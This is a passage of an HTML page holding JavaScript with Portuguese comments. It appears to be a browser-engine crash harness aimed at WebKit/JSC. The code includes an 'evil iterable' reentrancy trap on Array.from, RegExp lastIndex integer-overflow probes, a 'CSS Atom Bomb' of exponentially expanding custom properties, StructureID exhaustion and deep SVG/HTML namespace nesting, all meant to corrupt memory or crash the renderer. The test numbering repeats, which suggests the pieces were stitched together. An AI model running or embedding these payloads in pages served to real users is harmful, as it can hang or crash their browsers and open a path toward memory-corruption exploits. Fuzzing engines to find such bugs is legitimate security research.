                    // Tenta acessar com a função otimizada
                    const val = access(obj);
                    
                    if (val !== 1 && val !== undefined) {
                        log("ALERTA: Leitura inconsistente! Valor: " + val);
                        clearInterval(interval);
                    }
                    
                }, 10);
                
                setTimeout(() => {
                    clearInterval(interval);
                    log("Teste de Dicionário finalizado.");
                }, 2000);

            } catch(e) {
                log("Erro Dictionary: " + e.message);
            }
        }

        // --- TESTE 2: Array.from Iterator Resize Trap ---
        // Usa um iterador personalizado que altera o array de origem.
        // Ataca a lógica de alocação do Array.from.
        function runArrayFromTrap() {
            log("[2] Testando Array.from Reentrancy...");
            
            try {
                const source = [1, 2, 3, 4, 5];
                
                // Cria um iterável malicioso
                const evilIterable = {
                    [Symbol.iterator]() {
                        let step = 0;
                        return {
                            next() {
                                step++;
                                
                                // No meio da iteração, destruímos a fonte
                                if (step === 3) {
                                    log("Iterador no passo 3. Esvaziando fonte...");
                                    source.length = 0; // ZERA o array original
                                    // Tenta encher o buraco com lixo
                                    source.push(0x41414141);
                                }
                                
                                if (step > 5) return { done: true };
                                
                                return { value: source[step-1], done: false };
                            }
                        };
                    }
                };

                log("Executando Array.from(evilIterable)...");
                // O Array.from pode alocar memória baseada no tamanho inicial ou estimado.
                // Se mudarmos os dados durante a cópia, ele pode copiar lixo.
                const result = Array.from(evilIterable);
                
                log("Resultado: " + result);
                
            } catch(e) {
                log("Erro Array.from: " + e.message);
            }
        }

        // --- TESTE 3: RegExp lastIndex Integer Overflow ---
        // Testa se o motor trata lastIndex como 32-bit ou 64-bit.
        // Valores > 2^32 podem causar wrap-around (virar 0) em C++ mal escrito.
        function runRegexIndexOverflow() {
            log("[3] Testando RegExp Integer Overflow...");
            
            try {
                const re = /A/g;
                const str = "AAAAAA";
                
                // Valores de teste: 2^32, 2^32 + 1, MaxSafeInteger
                const targets = [
                    4294967296,      // 0x100000000 (Vira 0 em 32-bit)
                    4294967297,      // 0x100000001 (Vira 1 em 32-bit)
                    2147483648       // 0x80000000 (Negativo em 32-bit signed)
                ];

                targets.forEach(idx => {
                    re.lastIndex = idx;
                    log(`Definindo lastIndex = ${idx}. Executando exec()...`);
                    
                    const match = re.exec(str);
                    
                    // Se lastIndex fosse respeitado (como número gigante), não deveria achar nada na string pequena.
                    // Se achar (match != null), significa que o índice "deu a volta" ou foi ignorado.
                    if (match) {
                        log(`ALERTA: Match encontrado no índice ${match.index}!`);
                        log("O motor ignorou o valor gigante ou sofreu overflow.");
                    } else {
                        log("Sem match (Comportamento seguro).");
                    }
                });

            } catch(e) {
                log("Erro Regex: " + e.message);
            }
        }
function runCSSAtomBomb() {
            log("Armando CSS Atom Bomb...");
            
            const depth = 32; // 2^32 é suficiente para crashar qualquer sistema
            let css = ":root { --v" + depth + ": initial; ";
            
            // Gera a cadeia: --v(N): var(--v(N+1)) var(--v(N+1));
            for (let i = 0; i < depth; i++) {
                css += `--v${i}: var(--v${i+1}) var(--v${i+1}); `;
            }
            
            // Variável final com algum conteúdo
            css += `--v${depth}: BLOCK; }`;
            
            // Classe que dispara a detonação
            css += `
                .bomb {
                    /* Tenta usar a variável expandida numa propriedade string */
                    content: var(--v0); 
                    /* Ou numa propriedade de cor para forçar parse */
                    color: var(--v0); 
                }
            `;

            const style = document.createElement('style');
            style.textContent = css;
            document.head.appendChild(style);
            
            log("CSS injetado. Detonando...");
            
            setTimeout(() => {
                try {
                    const div = document.createElement('div');
                    div.className = "bomb";
                    document.body.appendChild(div);
                    
                    // Força o cálculo de estilo
                    const style = getComputedStyle(div);
                    const val = style.content; 
                    
                    log("Sistema sobreviveu (CSS otimizado?).");
                    document.body.removeChild(div);
                } catch(e) {
                    log("Erro de Layout: " + e.message);
                }
            }, 100);
        }

        // --- TESTE 2: JSC StructureID Table Exhaustion ---
        // Cria milhares de objetos com propriedades únicas.
        // Força o motor a criar milhares de "Hidden Classes" (StructureIDs).
        function runStructureIDExhaustion() {
            log("Iniciando StructureID Spam...");
            
            // Mantém referência para não permitir GC
            const shapes = [];
            let count = 0;
            
            const interval = setInterval(() => {
                // Cria 1000 novas "formas" por ciclo
                for(let i=0; i<1000; i++) {
                    const obj = {};
                    // O nome da propriedade define a "Forma". Nomes únicos = Novas formas.
                    obj["prop_" + count + "_" + i] = 1;
                    shapes.push(obj);
                }
                
                count++;
                if (count % 50 === 0) log(`Formas criadas: ${count * 1000}`);
                
                // Tenta atingir um limite crítico (ex: 65k ou 1M dependendo da arquitetura)
                if (count > 5000) { 
                    clearInterval(interval);
                    log("Teste pausado para evitar travamento total.");
                    
                    // Tenta transição de forma num objeto antigo para ver se a tabela corrompeu
                    try {
                        log("Testando corrupção de ID...");
                        shapes[0]["nova_prop"] = 1;
                    } catch(e) {
                        log("Erro Crítico: " + e.message);
                    }
                }
            }, 1);
        }

        // --- TESTE 3: SVG/HTML Namespace Recursion ---
        // Alterna namespaces profundamente. O RenderTreeBuilder odeia isso.
        function runNamespaceConfusion() {
            log("Construindo Árvore de Namespaces Mistos...");
            
            const container = document.getElementById('hidden-area');
            let current = container;
            const depth = 2000;
            
            try {
                for(let i=0; i<depth; i++) {
                    let el;
                    if (i % 2 === 0) {
                        // SVG Namespace
                        el = document.createElementNS("http://www.w3.org/2000/svg", "foreignObject");
                        el.setAttribute("width", "100");
                        el.setAttribute("height", "100");
                    } else {
                        // HTML Namespace (XHTML)
                        el = document.createElementNS("http://www.w3.org/1999/xhtml", "div");
                        // Estilo que força layer
                        el.style.transform = "translateZ(0)";
                    }
                    
                    current.appendChild(el);
                    current = el;
                }
                
                log(`Árvore criada (${depth} níveis). Forçando Render...`);
                
                // Força reflow
                const h = container.offsetHeight;
                log("Renderização concluída.");
                
                // O GOLPE: Destruir do meio para cima para ver se o crash ocorre na limpeza
                container.innerHTML = "";
                
            } catch(e) {
                log("Erro Namespace: " + e.message);
            }
        }



    </script>
</body>
</html>




